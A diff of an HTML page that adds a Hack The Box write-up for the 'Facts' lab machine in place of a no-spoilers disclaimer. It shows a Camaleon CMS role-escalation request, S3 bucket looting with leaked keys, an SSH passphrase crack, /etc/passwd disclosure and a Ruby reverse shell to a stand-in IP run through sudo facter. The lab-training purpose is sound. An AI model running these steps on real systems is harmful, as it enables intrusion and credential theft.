@@ -5,7 +5,6 @@
   <meta charset="utf-8" />
   <meta content="width=device-width, initial-scale=1.0" name="viewport" />
   <title>HTB Writeup - Facts</title>
-  <link href="../../assets/Icone.png" rel="icon" type="image/png" />
   <script>
     (function () {
       const THEME_STORAGE_KEY = 'portfolio-theme';
@@ -38,7 +37,7 @@
 </head>
 
 <body class="challenge-body">
-  <header class="challenge-hero">
+    <header class="challenge-hero" style="position: relative;">
     <div style="position: absolute; top: 1.5rem; right: 2rem; z-index: 10;">
       <button aria-label="Switch to light mode" class="theme-toggle" data-theme-toggle="" type="button">
         <span class="theme-track">
@@ -81,13 +80,377 @@
   <main class="challenge-main">
     <section aria-labelledby="overview-title" class="card section-overview">
       <header class="section-heading">
-        <p class="eyebrow">Disclaimer </p>
-        <h2 id="overview-title">Disclaimer</h2>
+        <p class="eyebrow">Summary </p>
+        <h2 id="overview-title">Machine Overview</h2>
       </header>
       <p>
-        <strong>Due to Hack The Box rules, we cannot share write-ups or solutions for active machines. Write-ups will be
-          published once the machines are retired.</strong>
+        Facts is an easy Linux machine that focuses on web application enumeration. Initial access is gained by
+        exploiting a vulnerable web service, and full system compromise is achieved through a misconfigured sudo
+        permission.
       </p>
+    </section>
+
+    <section aria-labelledby="description-title" class="card section-description">
+      <header class="section-heading">
+        <p class="eyebrow">Pentesting Process</p>
+        <h2 id="description-title">Service Enumeration</h2>
+      </header>
+      <p>
+        The assessment begins with a comprehensive service enumeration using <strong>Nmap</strong> in order to identify
+        exposed services and their versions.
+      </p>
+      <p>
+        <code class="language-bash">nmap -sC -sV 10.129.31.229</code>
+      </p>
+      <p>
+        The scan reveals two accessible services:
+      </p>
+      <p>
+      <pre class="terminal">
+              <code>
+Nmap scan report for 10.129.31.229
+Host is up (0.047s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.9p1 Ubuntu 3ubuntu3.2 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    nginx 1.26.3 (Ubuntu)
+|_http-server-header: nginx/1.26.3 (Ubuntu)
+|_http-title: Did not follow redirect to http://facts.htb/
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+            </code></pre>
+      </p>
+      <p>
+        The web server redirects traffic to the virtual host <code>facts.htb</code>, which was added to the local
+        <code>/etc/hosts</code> file to enable proper interaction.
+      </p>
+      <p>
+        <code class="language-bash">echo "10.129.31.229  facts.htb" >> /etc/hosts</code>
+      </p>
+      <header class="section-heading">
+        <h2 id="overview-title">Web Enumeration</h2>
+      </header>
+
+      <p>The website is a community forum for facts enthusiasts.</p>
+      <p>
+        <img src="./assets/main_page.png" style="width: 60%;" alt="Main Page">
+      </p>
+
+      <p>We use <strong>FFUF</strong> to enumerate the website’s subdirectories:</p>
+      <p>
+          <code class="language-bash">ffuf -w /snap/seclists/current/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -u http://facts.htb/FUZZ -e php,txt,html -fs 11060</code>
+      </p>
+      We identified the following subdirectories:
+      <p>
+      <pre class="terminal">
+              <code>
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.1.0
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://facts.htb/FUZZ
+ :: Wordlist         : FUZZ: /snap/seclists/current/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
+ :: Extensions       : php txt html 
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403
+ :: Filter           : Response size: 11060
+________________________________________________
+
+index                   [Status: 200, Size: 11075, Words: 1328, Lines: 125]
+search                  [Status: 200, Size: 19102, Words: 3276, Lines: 272]
+rss                     [Status: 200, Size: 183, Words: 20, Lines: 9]
+sitemap                 [Status: 200, Size: 3508, Words: 424, Lines: 130]
+en                      [Status: 200, Size: 11071, Words: 1328, Lines: 125]
+page                    [Status: 200, Size: 19508, Words: 3296, Lines: 282]
+welcome                 [Status: 200, Size: 11922, Words: 1481, Lines: 130]
+admin                   [Status: 302, Size: 0, Words: 1, Lines: 1]
+post                    [Status: 200, Size: 11270, Words: 1414, Lines: 152]
+            </code></pre>
+      </p>
+      <p>We identified an admin pannel at <strong>admin.php</strong>, which redirects to a login page where we can
+        register a new user.</p>
+      <p>
+        <img src="./assets/admin_page.png" style="width: 30%;" alt="Admin Page">
+      </p>
+      <p>We registered a new user and logged in. The assigned role is client, which has limited privileges.</p>
+
+      <header class="section-heading">
+        <h2 id="overview-title">Privilege Escalation (Web)</h2>
+      </header>
+      <p>
+        The website footer indicates that the application is powered by <strong>Camaleon CMS version 2.9.0</strong>.
+        <img src="./assets/camaleon_cms.png" style="width: 80%;" alt="Camaleon CMS">
+      </p>
+      <p>A privilege escalation vulnerability <strong>CVE-2025-2304</strong> affects Camaleon CMS 2.9.0 due to insecure
+        parameter handling in the <code>updated_ajax</code> method of the UsersController. The issue originates from the
+        use of the
+        dangerous <code>permit!</code> method, which allows all parameters to pass through without proper filtering.</p>
+
+      <p>Since no exploit was publicly available, we relied solely on the official patch diff between versions 2.9.0 and
+        2.9.1 on GitHub <a class="ref" href="#references">[1]</a></p>
+
+      <p>By reviewing the patch, we determined that the vulnerability was related to the password change functionality.
+      </p>
+
+      <h3>Analyzing the Password Change Process</h3>
+      <p>To change a password, a user navigates to: <code>http://facts.htb/admin/profile/edit</code></p>
+      <p>The page contains two distinct forms:</p>
+      <ol>
+        <li> A form for updating user profile information (first name, last name, email, etc.).</li>
+        <li> A second form responsible for updating the user’s password.</li>
+      </ol>
+      <p>The password form sends a POST request to:<code>/admin/users/5/updated_ajax</code>, with parameters structured
+        as <code>password[password]</code> and <code>password[password_confirmation]</code>.</p>
+      <h3>Identifying the Vulnerability</h3>
+      <p>According to the patch analysis, the server does not properly filter parameters inside the
+        <code>password[]</code> object.
+      </p>
+      <p>Because of the use of <code>permit!</code>, any additional parameter inside <code>password[]</code> is accepted
+        and processed.</p>
+      <p>In other words, if the server receives <code>password[key]=value</code>, it blindly updates the attribute key
+        with value.</p>
+      <p>This behavior allows an attacker to modify attributes that were never intended to be changed through this
+        endpoint.</p>
+      <h3>Exploitation</h3>
+      <p>We intercepted the legitimate password change request and modified it by adding
+        <code>password[role]=admin</code>
+      </p>
+      <p>The final request looked like this:</p>
+
+      <pre class="terminal">
+        <code>
+POST /admin/users/5/updated_ajax HTTP/1.1
+Host: facts.htb
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:147.0) Gecko/20100101 Firefox/147.0
+Accept: */*
+Accept-Language: en-US,en;q=0.9
+Accept-Encoding: gzip, deflate, br
+Referer: http://facts.htb/admin/profile/edit
+X-CSRF-Token: j77KaJf-ymn_-PYf3q32aKjiT5P-UWq7KCdza6pv967cmv9mi2_ajavuZtzgHFpaO0mFa7PKfIU-KXdxQylllA
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 188
+Origin: http://facts.htb
+Connection: keep-alive
+Cookie: _factsapp_session=28G79I5MFIYKQ0Kv5a%2BQB3isfeTVYFij7rEYuI02QkddU2g5JXp5TdPFxI12ukNB9uc2XP2j09JuXiVEhQz7qHhmryy%2B1yc6HFNoFWiLjUbZRBnhBxCshN%2FcbaW0H%2Fs77ruDSUUGwG18ayMV52Th3eH%2BiD4og%2BXoihX0z9%2BtuaNY0xEnNhdJw8rZ82KswFkae%2FjbeChnArOMWJAgs8Z3EavmiT%2B2PJE6%2BfxMj%2BSHEJykrwZpHNfnz7TdcKSkoR8dgHKeJ8blY56aF5B4fbWNMi2fQ503kA1%2BVeacf8RZDdI9tGvcyvfLo%2BZKFKv0MogZcKEB4eg0Nv4JrNM8tg2Hvgt8F0JvHZApH5tq9LkFm0P77WszDemQqs5c0uPzsz2Odg%3D%3D--cnyumTb3Jv1%2F4uYE--9chkInhJ7cq62PYrzcmSJA%3D%3D; auth_token=RdPxWJuC94pVv9fgtB1mmA&Mozilla%2F5.0+%28X11%3B+Ubuntu%3B+Linux+x86_64%3B+rv%3A147.0%29+Gecko%2F20100101+Firefox%2F147.0&10.10.15.190
+Priority: u=0
+
+_method=patch&authenticity_token=j77KaJf-ymn_-PYf3q32aKjiT5P-UWq7KCdza6pv967cmv9mi2_ajavuZtzgHFpaO0mFa7PKfIU-KXdxQylllA&password%5Bpassword%5D=user&password%5Bpassword_confirmation%5D=user&password%5Brole%5D=admin</code>
+      </pre>
+      <p>Since the server does not validate which attributes are allowed inside <code>password[]</code>, it processed
+        the role parameter as well.</p>
+      <p>As a result, our user was promoted to Administrator.</p>
+      <p>
+        <img src="./assets/escalation.png" style="width: 80%;" alt="Escalated Privileges">
+      </p>
+
+      <header class="section-heading">
+        <h2 id="overview-title">AWS S3 Enumeration</h2>
+      </header>
+      <p>In the settings page, we found information related to an AWS S3 bucket hosted on the machine, including its
+        access key and secret key.</p>
+      <p>
+        <img src="./assets/filesystem_settings.png" style="width: 80%;" alt="AWS Keys">
+      </p>
+
+      <p>We configure AWS CLI to access the S3 bucket.</p>
+      <p>
+        <code class="language-bash">aws configure</code>
+      </p>
+      <pre class="terminal">
+        <code>
+AWS Access Key ID : AKIAAACEAD8AD73C2F81
+AWS Secret Access Key : pwi4oTdMPFHZljzC8YbgfqpDjIKKvgYysXAm/8Zy
+Default region name : us-east-1
+Default output format : json</code>
+      </pre>
+      <p>We list the files in the bucket:</p>
+      <p>
+        <code class="language-bash">aws --endpoint-url http://facts.htb:54321 s3 ls s3://</code>
+      </p>
+      <p>The bucket contains two folders: <strong>randomfacts</strong>, which stores images, and
+        <strong>internal</strong>, which contains sensitive data, including a <string>.ssh</string> directory that holds
+        an SSH private key.
+      </p>
+      <p>
+        We retreive the content of the <strong>internal</strong> folder:</p>
+      <p>
+        <code class="language-bash">aws --endpoint-url http://facts.htb:54321 s3 sync s3://internal ./internal</code>
+      </p>
+      <p>The retreived SSH private key is:</p>
+      <pre class="terminal">
+        <code>
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABCmLaQvRQ
+RfXP/pDq514dOZAAAAGAAAAAEAAAAzAAAAC3NzaC1lZDI1NTE5AAAAIBmhNuhDBRGVAmme
+COcCq4yhKfwXhniBPtk3eiuEq64KAAAAoPzXtrRpzU5FVl9ctjqB6ZDPdGPcMq/hEjpu1R
+mqreVSQdaGq9ARE+Vrk8VM2fa11BXZ1R1DmLl4jaFv4Zad5het16U/IHOWtxAlrbaFOgYk
+jN/ieYDxBu6JV+vMaWWvhds1rbHZ9782QjWyYPbSBQqldXZfZbVeLICvGlFpdWzn0x+23K
+Eb8ahLB/xUe+bo9aJOCyl9baTqDiRulU3O7k0=
+-----END OPENSSH PRIVATE KEY-----</code>
+      </pre>
+
+      <header class="section-heading">
+        <h2 id="overview-title">Crack SSH Key</h2>
+      </header>
+      <p>We didn’t know which user the private key belonged to, so we tried to use the usernames mentioned on the
+        website. We quickly realized the key was encrypted with a passphrase.</p>
+
+      <p>
+        <code class="language-bash">chmod 600 id_ed25519 && ssh -i id_ed25519 carol@facts.htb</code>
+      </p>
+      <pre class="terminal">
+        <code>
+Enter passphrase for key 'id_ed25519':</code>
+      </pre>
+      <p>To crack the passphrase, we first extracted the hash from the private key using the <strong>ssh2john</strong>
+        script.</p>
+      <p>
+        <code class="language-bash">python3 ssh2john.py ./internal/.ssh/id_ed25519 > hash.txt</code>
+      </p>
+      <p>The extracted hash is shown below:</p>
+      <pre class="terminal">
+        <code>
+id_ed25519:$sshng$6$16$a62da42f45045f5cffe90eae75e1d399$290$6f70656e7373682d6b65792d7631000000000a6165733235362d637472000000066263727970740000001800000010a62da42f45045f5cffe90eae75e1d3990000001800000001000000330000000b7373682d656432353531390000002019a136e84305119502699e08e702ab8ca129fc178678813ed9377a2b84abae0a000000a0fcd7b6b469cd4e45565f5cb63a81e990cf7463dc32afe1123a6ed519aaade55241d686abd01113e56b93c54cd9f6b5d415d9d51d4398b9788da16fe1969de617add7a53f207396b71025adb6853a06248cdfe27980f106ee8957ebcc6965af85db35adb1d9f7bf364235b260f6d2050aa575765f65b55e2c80af1a5169756ce7d31fb6dca11bf1a84b07fc547be6e8f5a24e0b297d6da4ea0e246e954dceee4d$24$130</code>
+      </pre>
+      <p>We used <strong>John the Ripper</strong> to crack the hash.</p>
+      <p>
+        <code class="language-bash">john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt</code>
+      </p>
+      <p>The recovered passphrase was: <strong>dragonballz</strong></p>
+      <pre class="terminal">
+        <code>
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
+Cost 2 (iteration count) is 24 for all loaded hashes
+Will run 20 OpenMP threads
+Note: Passwords longer than 10 [worst case UTF-8] to 32 [ASCII] rejected
+Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
+dragonballz      (id_ed25519)</code>
+      </pre>
+
+      <header class="section-heading">
+        <h2 id="overview-title">User Identification</h2>
+      </header>
+
+      <p>Next, we attempted to determine which user the private key belonged to.</p>
+
+      <p>During our research, we discovered a technique to retrieve server-side files via the web server. This endpoint
+        was described in an article on <strong>CVE-2024-46987</strong>, which affects later versions than the one
+        running on the target <a class="ref" href="#references">[2]</a>.</p>
+
+      <p>Despite the version difference, we tested the technique and successfully retrieved the <code>/etc/passwd</code>
+        file from the server.</p>
+      <p>
+        <img src="./assets/passwd_read_file.png" style="width: 100%;" alt="/etc/passwd file">
+      </p>
+      <p>We identified a user named <strong>Trivia</strong>, who appears to be the owner of the SSH private key. Using
+        the previously discovered file disclosure technique, we retrieved the user’s SSH files to confirm this.</p>
+      <p>
+        <img src="./assets/trivia_ssh_key.png" style="width: 100%;" alt="SSH Private Key">
+      </p>
+      <header class="section-heading">
+        <h2 id="overview-title">Initial Access</h2>
+      </header>
+      <p>Using the recovered SSH key, we logged in as Trivia.</p>
+
+
+      <header class="section-heading">
+        <h2 id="overview-title">Privilege Escalation (System)</h2>
+      </header>
+
+      <p>We checked Trivia’s sudo privileges.</p>
+      <p>
+        <code class="language-bash">sudo -l</code>
+      </p>
+      <pre class="terminal">
+
+Matching Defaults entries for trivia on facts:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User trivia may run the following commands on facts:
+    (ALL) NOPASSWD: /usr/bin/facter
+      </pre>
+      <p>Trivia can run <stronger>Facter</stronger> <a class="ref" href="#references">[3]</a> as root.
+      </p>
+
+      <p>According to <strong>GTFOBins</strong>, facter allows executing Ruby scripts. We only need to specify the
+        directory where the Ruby file is located using the <code>--custom-dir</code> parameter <a class="ref" href="#references">[4]</a>.</p>
+
+      <p>We created a Ruby script that spawns a reverse shell and placed it inside a custom directory.</p>
+      <p>
+        <code class="language-bash">mkdir -p /tmp/exploit
+echo 'spawn("sh",[:in,:out,:err]=>TCPSocket.new("OUR_IP_ADDRESS",4444))'> /tmp/exploit/shell.rb</code>
+      </p>
+      <p>We ran facter as root with <code>--custom-dir</code> pointing to the directory containing the malicious Ruby
+        script.</p>
+      <p>
+        <code class="language-bash">sudo facter --custom-dir /tmp/exploit</code>
+      </p>
+      <p>
+        As a result, we received a root reverse shell from the target machine.
+      </p>
+      <p>
+        <img src="./assets/root_shell.png" style="width: 80%;" alt="Root Access">
+      </p>
+    </section>
+
+    <section aria-labelledby="overview-title" class="card section-overview">
+      <header class="section-heading">
+        <p class="eyebrow">Mitigation</p>
+        <h2 id="overview-title">Remediation</h2>
+      </header>
+      <p>
+        The following remediation steps can help prevent exploitation of the identified vulnerabilities:
+      </p>
+      <ul>
+        <li>Upgrade to <strong>Camaleon CMS 2.9.1</strong> or later.</li>
+        <li>Remove sensitive data from the S3 bucket.</li>
+        <li>Restrict the <code>facter</code> command for non-root users.</li>
+      </ul>
+    </section>
+
+    <section aria-labelledby="overview-title" class="card section-overview" id="references">
+      <header class="section-heading">
+        <p class="eyebrow">References</p>
+        <h2 id="overview-title">References</h2>
+      </header>
+
+      <ol type="1" style="list-style-type: none; counter-reset: ref-counter;">
+        <li style="counter-increment: ref-counter;">
+          <span style="font-weight: bold;">[<span style="content: counter(ref-counter);">1</span>]</span>
+          <a href="https://github.com/owen2345/camaleon-cms/pull/1109/changes/97f00aedbbb90d7e762b60b2b140e22021014bf2"
+            target="_blank" rel="noopener noreferrer">
+            GitHub | Camaleon CMS changes</a>
+        </li>
+        <li style="counter-increment: ref-counter;">
+          <span style="font-weight: bold;">[<span style="content: counter(ref-counter);">2</span>]</span>
+          <a href="https://strobes.co/vi/cve/CVE-2024-46987" target="_blank" rel="noopener noreferrer">
+            Strobes | CVE-2024-46987</a>
+        </li>
+        <li style="counter-increment: ref-counter;">
+          <span style="font-weight: bold;">[<span style="content: counter(ref-counter);">3</span>]</span>
+          <a href="https://man.archlinux.org/man/facter.8.en" target="_blank" rel="noopener noreferrer">
+            Arch Linux | Facter</a>
+        </li>
+        <li style="counter-increment: ref-counter;">
+          <span style="font-weight: bold;">[<span style="content: counter(ref-counter);">4</span>]</span>
+          <a href="https://gtfobins.org/gtfobins/facter" target="_blank" rel="noopener noreferrer">
+            GTFOBins | Facter</a>
+        </li>
+
+      </ol>
     </section>
 
     <section aria-labelledby="overview-title" class="card section-overview">
